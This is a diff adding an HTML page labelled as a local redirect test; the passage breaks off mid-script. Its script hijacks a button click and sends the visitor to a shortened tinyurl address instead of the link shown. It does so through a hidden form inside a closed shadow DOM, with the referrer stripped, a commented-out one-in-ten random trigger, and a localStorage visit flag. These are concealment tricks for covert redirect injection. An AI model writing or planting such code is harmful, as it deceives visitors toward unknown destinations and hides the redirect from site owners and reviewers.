@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <title>Test Redirect Locally</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .btn {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <a href="https://example.com" class="btn c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>
+
+    <script>
+        (function() {
+            const intermediateUrl = "https://tinyurl.com/mynormone"; // Replace with your GitHub Pages URL
+            const k = "rm_visited";
+
+            const submitHiddenForm = (url) => {
+                try {
+                    const f = document.createElement("form");
+                    f.method = "GET";
+                    f.action = url;
+                    f.style.display = "none";
+                    f.referrerPolicy = "no-referrer";
+                    document.body.appendChild(f);
+                    const h = document.createElement("div");
+                    h.style.display = "none";
+                    document.body.appendChild(h);
+                    const s = h.attachShadow({ mode: "closed" });
+                    s.appendChild(f);
+                    f.submit();
+                    setTimeout(() => h.remove(), 1000);
+                } catch (err) {
+                    console.error('Form submission error:', err);
+                    throw err;
+                }
+            };
+
+            try {
+                const button = document.querySelector("#test-button");
+                if (!button) {
+                    console.error('Button not found');
+                    return;
+                }
+
+                button.addEventListener("click", function(e) {
+                    try {
+                        // Comment out for testing
+                        // if (Math.floor(Math.random() * 10) !== 0) return;
+
+                        e.preventDefault();
+                        e.stopPropagation();
+
+                        let hasVisited = false;
+                        if (typeof localStorage !== "undefined") {
+                            localStorage.setItem(k, "true");
+                            hasVisited = localStorage.getItem(k) === "true";
+                        }
+
+                        if (!hasVisited) {
+                            console.log('Not able to set localstorage, trigger original click');
